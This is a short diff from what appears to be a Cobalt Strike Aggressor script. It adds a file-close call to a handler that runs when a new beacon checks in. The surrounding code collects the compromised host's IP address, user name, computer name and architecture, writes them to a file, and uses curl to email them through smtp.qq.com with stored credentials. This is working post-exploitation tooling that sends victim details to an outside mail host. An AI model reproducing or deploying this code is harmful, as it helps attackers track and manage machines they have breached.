@@ -31,6 +31,7 @@ on beacon_initial{
         $Mail_content = "From:".$From."\r\nTo:".$To."\r\nSubject:CobaltStriker\r\n\r\nIP:".$IP."\r\nUser:".$User."\r\nComputerName:".$ComName."\r\nArch:".$Arch;
         $Handle = openf(">mail.txt");
         writeb($Handle, $Mail_content); 
+        closef($Handle);
         @Curl_command = @('curl', '-s' ,'--url','smtp://smtp.qq.com', '--mail-from', $From, '--mail-rcpt', $To, '--upload-file','mail.txt', '--user', $UserName.':'.$Password);
         exec(@Curl_command);
         action("\c9Send Done: ".$ComName."!");
